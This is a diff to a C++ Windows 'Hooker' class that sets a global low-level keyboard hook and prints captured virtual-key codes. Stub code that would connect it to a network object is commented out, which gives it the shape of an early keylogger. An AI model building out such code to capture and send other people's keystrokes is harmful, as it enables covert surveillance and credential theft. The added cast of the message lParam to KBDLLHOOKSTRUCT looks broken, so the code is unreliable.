@@ -1,6 +1,6 @@
 #include "Hooker.hh"
 
-Hooker::Hooker(/*Network& network*/) /* :_network(network)*/ {
+Hooker::Hooker() {
 	isConnected() = connect();
 	initializeHooks();
 }
@@ -10,10 +10,9 @@ Hooker::~Hooker() {
 }
 
 Hooker& Hooker::getInstance() {
-	static Hooker    instance;
+	static Hooker	instance;
 	return instance;
 }
-
 
 void Hooker::runHookLoop()
 {
@@ -21,6 +20,7 @@ void Hooker::runHookLoop()
 	while (GetMessage(&message, NULL, 0, 0)) {
 		TranslateMessage(&message);
 		DispatchMessage(&message);
+		std::cout << message.wParam << "  " << ((KBDLLHOOKSTRUCT *)message.lParam)->vkCode << std::endl;
 	}
 }
 
@@ -51,23 +51,14 @@ bool Hooker::connect()
 }
 
 bool& Hooker::isConnected()
-{
-	return _connected;
-}
+{return _connected;}
 
-/*
-Network& Hooker::getNetwork()
-{
-	return _network;
-}
-*/
+//Network& Hooker::getNetwork()
+//{return *_network;}
 
 LRESULT CALLBACK LowLevelKeyboardProc(int nCode, WPARAM wParam, LPARAM lParam)
 {
 	if (nCode >= 0) {
-		std::cout << nCode << std::endl;
-		std::cout << wParam << std::endl;
-		std::cout << ((KBDLLHOOKSTRUCT *)lParam)->vkCode << std::endl;
 	}
 	return CallNextHookEx(0, nCode, wParam, lParam);
 }
